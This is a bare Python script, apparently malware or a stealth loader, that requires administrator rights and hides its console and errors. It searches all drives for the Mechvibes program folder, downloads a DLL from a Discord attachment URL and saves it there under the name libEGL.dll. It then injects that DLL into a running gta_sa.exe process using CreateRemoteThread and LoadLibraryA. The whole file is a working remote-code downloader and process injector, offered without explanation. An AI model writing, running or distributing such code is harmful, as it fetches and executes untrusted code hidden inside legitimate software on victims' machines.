import os
import sys
import subprocess
import ctypes
from ctypes import wintypes

def execute_silent_injection():
    try:
        import requests
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        import requests

    DLL_NAME = "libEGL.dll"
    PROCESS_NAME = "gta_sa.exe"
    DLL_DOWNLOAD_URL = "https://cdn.discordapp.com/attachments/1393441968566046750/1393875216672882709/libEGL.dll?ex=6874c2f4&is=68737174&hm=36816ae99da750f5ef1cceea6f3c2bf016c8afe44e550a126d53733cad68a6fa&"

    k32 = ctypes.WinDLL('kernel32', use_last_error=True)
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT_RESERVE = 0x3000
    PAGE_READWRITE = 0x04

    k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    k32.OpenProcess.restype = wintypes.HANDLE
    k32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    k32.VirtualAllocEx.restype = wintypes.LPVOID
    k32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    k32.WriteProcessMemory.restype = wintypes.BOOL
    k32.GetModuleHandleA.argtypes = [wintypes.LPCSTR]
    k32.GetModuleHandleA.restype = wintypes.HMODULE
    k32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
    k32.GetProcAddress.restype = wintypes.LPVOID
    k32.CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID]
    k32.CreateRemoteThread.restype = wintypes.HANDLE
    k32.CloseHandle.argtypes = [wintypes.HANDLE]
    k32.CloseHandle.restype = wintypes.BOOL

    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return
    except:
        return

    if sys.maxsize > 2**32:
        try:
            subprocess.Popen(['py', '-3-32'] + sys.argv, creationflags=0x08000008, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            sys.exit()
        except FileNotFoundError:
            pass

    mech_dir = None
    for drive in [f"{chr(c)}:\\" for c in range(65, 91) if os.path.exists(f"{chr(c)}:\\")]:
        for root, _, files in os.walk(drive):
            if "Uninstall Mechvibes.exe" in files:
                mech_dir = os.path.dirname(os.path.join(root, "Uninstall Mechvibes.exe"))
                break
        if mech_dir:
            break
    if not mech_dir:
        return

    dll_path = os.path.join(mech_dir, DLL_NAME)

    try:
        r_dll = requests.get(DLL_DOWNLOAD_URL, timeout=15)
        if r_dll.status_code == 200:
            with open(dll_path, "wb") as f:
                f.write(r_dll.content)
        else:
            return
    except:
        return

    try:
        output = subprocess.check_output(f'tasklist /FI "IMAGENAME eq {PROCESS_NAME}" /NH', shell=True, stderr=subprocess.DEVNULL)
        pid = int(output.strip().split()[1])
    except:
        return
    if not pid:
        return

    h_process = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        return

    dll_bytes = dll_path.encode('ascii')
    mem_addr = k32.VirtualAllocEx(h_process, None, len(dll_bytes) + 1, MEM_COMMIT_RESERVE, PAGE_READWRITE)
    if not mem_addr:
        k32.CloseHandle(h_process)
        return

    if not k32.WriteProcessMemory(h_process, mem_addr, dll_bytes, len(dll_bytes) + 1, None):
        k32.CloseHandle(h_process)
        return

    load_library_addr = k32.GetProcAddress(k32.GetModuleHandleA(b'kernel32.dll'), b'LoadLibraryA')
    h_thread = k32.CreateRemoteThread(h_process, None, 0, load_library_addr, mem_addr, 0, None)
    if not h_thread:
        k32.CloseHandle(h_process)
        return

    k32.CloseHandle(h_thread)
    k32.CloseHandle(h_process)
